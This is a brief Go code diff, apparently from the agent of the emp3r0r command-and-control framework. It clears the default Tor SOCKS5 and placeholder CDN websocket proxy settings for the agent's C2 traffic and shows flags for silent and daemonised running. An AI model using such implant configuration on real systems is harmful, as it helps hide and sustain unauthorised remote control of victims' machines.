@@ -17,8 +17,8 @@ import (
 )
 
 func main() {
-	c2proxy := flag.String("proxy", "socks5://127.0.0.1:9050", "Proxy for emp3r0r agent's C2 communication")
-	cdnProxy := flag.String("cdnproxy", "wss://example.com/", "CDN proxy for emp3r0r agent's C2 communication")
+	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
+	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
 	silent := flag.Bool("silent", false, "Suppress output")
 	daemon := flag.Bool("daemon", false, "Daemonize")
 	flag.Parse()
